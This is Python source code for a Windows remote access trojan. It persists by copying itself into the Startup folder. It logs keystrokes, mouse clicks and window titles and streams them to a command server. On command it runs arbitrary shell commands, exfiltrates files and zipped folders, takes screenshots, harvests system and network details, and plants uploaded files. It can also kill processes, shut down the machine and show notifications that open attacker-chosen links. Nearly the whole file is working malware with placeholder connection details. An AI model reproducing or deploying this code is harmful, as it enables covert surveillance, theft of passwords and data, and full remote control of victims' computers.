import os 
import re
import sys
import gtts
import time
import uuid
import base64
import random
import socket
import shutil
import psutil
import pyglet
import pynput
import cpuinfo
import datetime
import platform
import requests
import win32api
import win32gui
import pyautogui
import threading
import subprocess
import webbrowser
import win10toast_click

ip = "ip"
port = "port"
buffer_size = 1024
loggedKeys = "" 
storedKey = ""
activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
running = False
saveFile = ""

try: #IF EXIST DONT DO
    try:
        shutil.copy(f"{sys.executable[:999]}", f"{os.path.expanduser('~')}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    except shutil.SameFileError:
        pass
except:
    pass

try: 
    public_ip = requests.get('https://api.ipify.org').text
except requests.exceptions.ConnectionError:
    public_ip = f"Couldn't get the IP because the website https://api.ipify.org didn't respond. {random.randint(0, 99999)}"
except:
    public_ip = "Couldn't get the IP because of an unknown error."

def abcdefg():
    def mouseget():
        global loggedKeys
        state_left = win32api.GetKeyState(0x01)

        while True:
            while running:
                if win32api.GetKeyState(0x01) != state_left:
                    state_left = win32api.GetKeyState(0x01)
                    if win32api.GetKeyState(0x01) < 0: 
                        loggedKeys = loggedKeys + f" [Mouse.Left_Click] ".replace("'", "")
                time.sleep(0.2)
            time.sleep(1)

    def send():
        global loggedKeys
        global activeWindow
        global running
        global client

        while True:
            while running:
                time.sleep(5)
                
                try:
                    client.send(f"K {loggedKeys}".encode("utf-8"))
                    loggedKeys = ""
                except Exception as e:
                    if str(e).startswith("[WinError 10057]"):
                        running = False
                
                activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            time.sleep(1)


    def windowget():
        global loggedKeys
        global activeWindow

        while True:
            while running:
                if win32gui.GetWindowText(win32gui.GetForegroundWindow()) != activeWindow:
                    loggedKeys = loggedKeys + f" [{win32gui.GetWindowText(win32gui.GetForegroundWindow())}] ".replace("'", "")
                    activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                time.sleep(0.02)
            time.sleep(1)


    def keyboardget(key):
        global loggedKeys
        global storedKey
        try:
            loggedKeys = loggedKeys + f"{str(storedKey)}".replace("'", "")

            if key.vk >= 96 and key.vk <= 105: 
                storedKey = int(key.vk) - 96
            else: 
                storedKey = key.char
        except AttributeError: 
            loggedKeys = loggedKeys + f" [{str(key)}] ".replace("'", "")

    threading.Thread(target=mouseget, daemon=True).start()
    threading.Thread(target=send, daemon=True).start()
    threading.Thread(target=windowget, daemon=True).start()
    with pynput.keyboard.Listener(on_press=keyboardget) as listener: listener.join()

def getAdvancedData():
    global saveFile
    def get_size(bytes, suffix="B"):
            """
            Scale bytes to its proper format
            e.g:
                1253656 => '1.20MB'
                1253656678 => '1.17GB'
            """
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor

    def System_information():
        with open(f"{saveFile}.txt", "w") as f:
            f.write("="*40 + "System Information" + "="*40 + "\n")
            uname = platform.uname()
            f.write(f"System: {uname.system}\n")
            f.write(f"Node Name: {uname.node}\n")
            f.write(f"Release: {uname.release}\n")
            f.write(f"Version: {uname.version}\n")
            f.write(f"Machine: {uname.machine}\n") 
            f.write(f"Processor: {uname.processor}") 
            f.write(f"Processor: {cpuinfo.get_cpu_info()['brand_raw']}\n")
            f.write(f"Ip-Address: {socket.gethostbyname(socket.gethostname())}\n") #"
            f.write(f"Public-Ip-Address: {requests.get(f'https://api.ipify.org').text}\n")
            f.write(f"Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n")

            f.write("="*40 + "Boot Time" + "="*40 + "\n")
            boot_time_timestamp = psutil.boot_time()
            bt = datetime.datetime.fromtimestamp(boot_time_timestamp)
            f.write(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n")

            f.write("="*40 + "CPU Info" + "="*40 + "\n")
            f.write("Physical cores: " + str(psutil.cpu_count(logical=False)) + "\n")
            f.write("Total cores: " + str(psutil.cpu_count(logical=True)) + "\n")
            cpufreq = psutil.cpu_freq()
            f.write(f"Max Frequency: {cpufreq.max:.2f}Mhz\n")
            f.write(f"Min Frequency: {cpufreq.min:.2f}Mhz\n")
            f.write(f"Current Frequency: {cpufreq.current:.2f}Mhz\n")
            f.write("CPU Usage Per Core:")
            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                f.write(f"Core {i}: {percentage}%\n")
            f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n")


            f.write("="*40 + "Memory Information" + "="*40 + "\n")
            svmem = psutil.virtual_memory()
            f.write(f"Total: {get_size(svmem.total)}\n")
            f.write(f"Available: {get_size(svmem.available)}\n")
            f.write(f"Used: {get_size(svmem.used)}\n")
            f.write(f"Percentage: {svmem.percent}%\n")

            f.write("="*40 + "SWAP" + "="*40 + "\n")
            swap = psutil.swap_memory()
            f.write(f"Total: {get_size(swap.total)}\n")
            f.write(f"Free: {get_size(swap.free)}\n")
            f.write(f"Used: {get_size(swap.used)}\n")
            f.write(f"Percentage: {swap.percent}%\n")

            f.write("="*40 + "Disk Information" + "="*40 + "\n")
            f.write("Partitions and Usage:\n")
            partitions = psutil.disk_partitions()
            for partition in partitions:
                f.write(f"=== Device: {partition.device} ===\n")
                f.write(f"  Mountpoint: {partition.mountpoint}\n")
                f.write(f"  File system type: {partition.fstype}\n")
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                f.write(f"  Total Size: {get_size(partition_usage.total)}\n")
                f.write(f"  Used: {get_size(partition_usage.used)}\n")
                f.write(f"  Free: {get_size(partition_usage.free)}\n")
                f.write(f"  Percentage: {partition_usage.percent}%\n")

            disk_io = psutil.disk_io_counters()
            f.write(f"Total read: {get_size(disk_io.read_bytes)}\n")
            f.write(f"Total write: {get_size(disk_io.write_bytes)}\n")

            f.write("="*40 + "Network Information" + "="*40 + "\n")
            if_addrs = psutil.net_if_addrs()
            for interface_name, interface_addresses in if_addrs.items():
                for address in interface_addresses:
                    f.write(f"=== Interface: {interface_name} ===\n")
                    if str(address.family) == 'AddressFamily.AF_INET':
                        f.write(f"  IP Address: {address.address}\n")
                        f.write(f"  Netmask: {address.netmask}\n")
                        f.write(f"  Broadcast IP: {address.broadcast}\n")
                    elif str(address.family) == 'AddressFamily.AF_PACKET':
                        f.write(f"  MAC Address: {address.address}\n")
                        f.write(f"  Netmask: {address.netmask}\n")
                        f.write(f"  Broadcast MAC: {address.broadcast}\n")

            net_io = psutil.net_io_counters()
            f.write(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}\n")
            f.write(f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n")


    if __name__ == "__main__":
        System_information()

def A(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("A ") == public_ip  or message.removeprefix("A ") == "*":
            getAdvancedData()
            with open(f"{saveFile}.txt", "rb") as f:
                client.send("A".encode("utf-8"))
                time.sleep(0.1)
                client.send(base64.encodebytes(f.read()))
            os.remove(f"{saveFile}.txt")
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def B(client, message, nickname):
    global saveFile
    try:
        global buffer_size
        if message.removeprefix("B ").split(" ")[0] == nickname or message.removeprefix("B ").split(" ")[0] == "*":
            buffer_size = int(message.removeprefix("B ").split(" ")[1])
            return
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8")) 

def C(): # soon vypnutí skrz exit()
    global saveFile
    pass

def D(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("D ").split(" ")[0] == nickname or message.removeprefix("D ").split(" ")[0] == "*":
            with open(str(message.removeprefix("D ").split(" ")[1:]).replace("[", "").replace("]", "").replace("',", "").replace("'", ""), 'rb') as f:
                client.send("D".encode("utf-8"))
                time.sleep(0.1)
                client.send(f"{message.split('.')[-1]}".encode("utf-8"))
                time.sleep(0.1)
                client.send(base64.encodebytes(f.read()))
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def E(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("E ").split(" ")[0] == nickname or message.removeprefix("E ").split(" ")[0] == "*":
            cmd = str(message.removeprefix('E ').split(" ")[1:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "")
            resp = subprocess.getoutput(cmd)
            if resp == "":
                resp = "None"
            client.send(f"[SUCCESS]: Successfully executed! Command: {cmd}, Response: {resp} ({nickname})".encode("utf-8")) 
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))  

def F(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("F ").split(" ")[0] == nickname or message.removeprefix("F ").split(" ")[0] == "*":
            if message.removeprefix("F ").split(" ")[1].startswith("shutdown"):
                client.send(f"[SUCCESS]: PC shutdowned! ({nickname})".encode("utf-8"))
                subprocess.Popen('shutdown /s /t 0')
            elif message.removeprefix("F ").split(" ")[1].startswith("lock"):
                client.send(f"[SUCCESS]: PC locked! ({nickname})".encode("utf-8"))
                subprocess.Popen('rundll32.exe user32.dll,LockWorkStation')  
            else:
                client.send(f"[ERROR]: Invalid arguments.".encode("utf-8"))  
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8")) 

def I(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("I ").split(" ")[0] == nickname or message.removeprefix("I ").split(" ")[0] == "*":
            saveFile = message.removeprefix("I ").split(" ")[1]
            client.send(f"[SUCCESS]: Path changed to {saveFile} ({nickname})".encode("utf-8"))   
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))        

def K(client, message, nickname): 
    global saveFile    
    global running
    try:
        if message.removeprefix("K ").split(" ")[0] == nickname or message.removeprefix("K ").split(" ")[0] == "*":
            if str(message.removeprefix("K ").split(" ")[1]).lower() == "on":
                running = True
            if str(message.removeprefix("K ").split(" ")[1]).lower() == "off":
                running = False
            client.send(f"[SUCCESS]: Keylogger has been set to {str(running)} ({nickname})".encode("utf-8"))
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def M(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("M ").split(" ")[0] == nickname or message.removeprefix("M ").split(" ")[0] == "*":
            cmd = str(message.removeprefix('M ').split(" ")[1:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "")
            subprocess.Popen(f"msg * {cmd}")
            client.send(f"[SUCCESS]: ({nickname})".encode("utf-8"))  
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def P(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("P ").split(" ")[0] == nickname or message.removeprefix("P ").split(" ")[0] == "*":
            pyautogui.screenshot().save(f"{saveFile}.png")
            client.send("P".encode("utf-8"))
            time.sleep(1)
            client.send("png".encode("utf-8"))
            with open(f"{saveFile}.png", 'rb') as f:
                client.send(base64.encodebytes(f.read()))
            os.remove(f"{saveFile}.png")
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8")) 

def S(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("S ").split(" ")[0] == nickname or message.removeprefix("S ").split(" ")[0] == "*":
            msg = str(message.removeprefix("S ").split(" ")[2:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "").replace("\"", "")
            lang = message.removeprefix("S ").split(" ")[1]
            gtts.gTTS(text=msg, lang=lang, slow=False).save(f"{os.path.expanduser('~')}/Desktop/message.mp3")
            pyglet.media.load(f"{os.path.expanduser('~')}/Desktop/message.mp3").play()
            os.remove(f"{os.path.expanduser('~')}/Desktop/message.mp3")
            client.send(f"[SUCCESS]: Successfully executed! (msg=\"{msg}\", lang=\"{lang}\") ({nickname})".encode("utf-8"))
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8")) 

def T(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("T ").split(" ")[0] == nickname or message.removeprefix("T ").split(" ")[0] == "*":
            resp = subprocess.getoutput(f"taskkill /im {message.removeprefix('T ').split(' ')[1]} /f").replace('\n', ' ----- ')
            client.send(f"[SUCCESS] {str(resp)}".encode('utf-8'))
            time.sleep(0.2)
            client.send(f"[SUCCESS] ({nickname})".encode("utf-8"))
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def U(client, message, nickname): # + ZRYCHLIT
    global saveFile
    global buffer_size
    try:
        if message.split(" ")[1] == nickname or message.split(" ")[1] == "*":
                path = client.recv(buffer_size).decode("utf-8")
                data = client.recv(buffer_size)
                with open(path, 'wb') as f:
                    f.write(base64.decodebytes(data))
                client.send(f"[SUCCESS]: Uploaded as {path} ({nickname})".encode("utf-8"))  
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8")) 


def W(client, message, nickname):
    global saveFile
    try:
        if message.removeprefix("W ").split(" ")[0] == nickname or message.removeprefix("W ").split(" ")[0] == "*":
            win10toast_click.ToastNotifier().show_toast(
            str(message.removeprefix("W ").split(" ")[2:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "").split(", ")[0],
            str(message.removeprefix("W ").split(" ")[2:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "").split(", ")[1],
            icon_path=None,
            duration=10, 
            threaded=True,
            callback_on_click=lambda: webbrowser.open_new(message.removeprefix("W ").split(" ")[1]))
            client.send(f"[SUCCESS]: Successfully executed. ({nickname})".encode("utf-8"))
    except Exception as e:
        client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def Z(client, message, nickname): #RESPONSE
    global saveFile
    try:
        if message.removeprefix("Z ").split(" ")[0] == nickname or message.removeprefix("Z ").split(" ")[0] == "*":
            path = str(str(message.removeprefix("Z ").split(" ")[1:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "").split(", ")[0])
            shutil.make_archive(path, "zip", str(message.removeprefix("Z ").split(" ")[1:]).replace("[", "").replace("]", "").replace("',", "").replace("'", "").split(", ")[0])
            with open(f"{path}.zip", "rb") as f:
                client.send("Z".encode("utf-8"))
                time.sleep(0.1)
                client.send("zip".encode("utf-8"))
                time.sleep(0.1)
                client.send(base64.encodebytes(f.read()))
            os.remove(f"{path}.zip")
    except Exception as e:
            client.send(f"[ERROR]: {e} ({nickname})".encode("utf-8"))

def heartbeat():
    global client
    while True:
        try:
            client.send("".encode("utf-8"))
            time.sleep(1)
        except Exception as e:
            pass
        time.sleep(1)

def main():
    global run
    global ip
    global port
    global client 
    global running
    global public_ip
    global buffer_size

    try: 
        run = False
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        client.send("".encode("utf-8"))

        threading.Thread(target=heartbeat, daemon=True).start()

        while True:
            message = client.recv(buffer_size).decode("utf-8")
            if message == "NICKNAME": client.send(public_ip.encode("utf-8"))
            elif message.upper().startswith("A"): A(client, message, public_ip) 
            elif message.upper().startswith("B"): B(client, message, public_ip) 
            elif message.upper().startswith("C"): C(client, message, public_ip) 
            elif message.upper().startswith("D"): D(client, message, public_ip)
            elif message.upper().startswith("E"): E(client, message, public_ip) 
            elif message.upper().startswith("F"): F(client, message, public_ip) 
            elif message.upper().startswith("I"): I(client, message, public_ip)
            elif message.upper().startswith("K"): K(client, message, public_ip) 
            elif message.upper().startswith("M"): M(client, message, public_ip)
            elif message.upper().startswith("P"): P(client, message, public_ip) 
            elif message.upper().startswith("S"): S(client, message, public_ip)
            elif message.upper().startswith("T"): T(client, message, public_ip)
            elif message.upper().startswith("U"): U(client, message, public_ip) 
            elif message.upper().startswith("W"): W(client, message, public_ip)
            elif message.upper().startswith("Z"): Z(client, message, public_ip)
    except Exception as e:
        print(e)
        run = True

threading.Thread(target=abcdefg).start()

run = True
while run == True:
    try: 
        main()  
    except: 
        time.sleep(1)
        pass